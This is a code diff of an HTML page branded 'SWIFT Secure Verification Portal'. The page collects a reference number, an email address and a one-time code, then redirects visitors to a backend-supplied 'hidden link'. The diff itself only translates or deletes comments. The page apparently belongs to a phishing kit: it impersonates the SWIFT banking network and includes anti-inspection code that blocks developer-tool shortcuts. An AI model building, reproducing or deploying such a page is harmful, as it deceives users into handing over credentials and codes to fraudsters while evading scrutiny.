@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>SWIFT Secure Verification Portal</title>
 <style>
-    /* CSS kodların olduğu kimi qalır */
+    /* CSS code remains the same as provided previously */
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
     body {
         background: linear-gradient(rgba(0, 107, 60, 0.04), rgba(0, 107, 60, 0.04)),
@@ -123,7 +123,6 @@
         });
     }
 
-    // Step 1: Reference Check (Backend-də yoxlanılır)
     document.getElementById('step1Next').onclick = async () => {
         const ref = document.getElementById('referenceNumber').value.trim();
         const err = document.getElementById('refError');
@@ -151,7 +150,6 @@
         }
     };
 
-    // Step 2: Email Send
     document.getElementById('sendCode').onclick = async () => {
         const email = document.getElementById('email').value.trim();
         const err = document.getElementById('emailError');
@@ -185,7 +183,6 @@
         } finally { load.style.display = 'none'; }
     };
 
-    // Step 3: Final Verification
     document.getElementById('verifyCode').onclick = async () => {
         const code = document.getElementById('codeInput').value.trim();
         const err = document.getElementById('codeError');
@@ -203,7 +200,6 @@
 
             if (data.success && data.redirect) {
                 showStep(4);
-                // Backend-dən gələn gizli linkə yönləndiririk
                 setTimeout(() => window.location.href = data.redirect, 2000);
             } else {
                 err.textContent = 'Incorrect or expired code.';
@@ -215,7 +211,6 @@
         } finally { load.style.display = 'none'; }
     };
 
-    // Anti-Inspect (F12 və s.)
     document.addEventListener('keydown', e => {
         if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
             e.preventDefault();
